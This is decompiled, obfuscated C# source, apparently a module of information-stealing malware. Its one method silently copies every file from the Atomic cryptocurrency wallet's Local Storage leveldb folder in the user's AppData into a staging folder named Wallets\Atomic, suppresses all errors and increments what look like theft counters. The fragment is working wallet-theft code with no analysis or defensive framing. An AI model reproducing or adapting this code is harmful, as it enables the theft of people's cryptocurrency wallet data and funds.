using System;
using System.IO;
using Moist;

// Token: 0x0200005A RID: 90
internal class Class27
{
	// Token: 0x06000246 RID: 582 RVA: 0x000129F8 File Offset: 0x00010BF8
	public static void smethod_0(string string_1)
	{
		try
		{
			foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
			{
				Directory.CreateDirectory(string_1 + Class27.string_0);
				fileInfo.CopyTo(string_1 + Class27.string_0 + fileInfo.Name);
			}
			Class27.int_0++;
			Class37.int_0++;
		}
		catch
		{
		}
	}

	// Token: 0x06000247 RID: 583 RVA: 0x0000446C File Offset: 0x0000266C
	public Class27()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x06000248 RID: 584 RVA: 0x00005271 File Offset: 0x00003471
	// Note: this type is marked as 'beforefieldinit'.
	static Class27()
	{
		Class40.gcO0h7LzslQIW();
		Class27.int_0 = 0;
		Class27.string_0 = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";
	}

	// Token: 0x04000107 RID: 263
	public static int int_0;

	// Token: 0x04000108 RID: 264
	public static string string_0;
}
